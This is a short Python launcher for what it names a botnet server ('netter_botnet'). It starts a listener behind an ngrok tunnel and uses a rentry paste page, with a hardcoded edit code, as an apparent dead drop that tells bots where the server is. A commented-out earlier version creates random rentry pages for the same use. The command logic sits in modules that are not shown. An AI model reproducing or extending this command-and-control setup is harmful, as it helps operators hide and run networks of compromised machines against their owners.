from core.rentry import Rentry
from core.http import NetterServer
from pyngrok import ngrok
from os import _exit

import json

# def main():
#     ngrokConfig = ngrok.PyngrokConfig(auth_token = json.load(open('config.json'))['ngrokAuthToken'])
#     netterServer: NetterServer = NetterServer(ngrokConfig = ngrokConfig)

#     Create a new Rentry url with the same edit code as the url name
#     url: str = Rentry.new((uname := token_urlsafe(16)), text = 'blank', edit_code = uname ); \
#         logger.info('Rentry server url created with url name ' + uname)

#     netterServer.rentryUrlName = uname # Connect to your newly created rentry server

#     netterServer.startNgrokTunnel(useRentry = True, rentryEditCode = uname)
#     netterServer.listen()

#     Rentry.delete(uname, uname)


def main():
    ngrokConfig = ngrok.PyngrokConfig(
        auth_token = json.load(open('config.json'))['ngrokAuthToken']
    )

    netterServer: NetterServer = NetterServer(ngrokConfig = ngrokConfig)

    netterServer.rentryUrlName = 'netter_botnet'
    netterServer.rentryEditCode = '924450817Gg'

    # netterServer.startNgrokTunnel(useRentry = True)
    netterServer.listen()

if __name__ == "__main__":
    main()
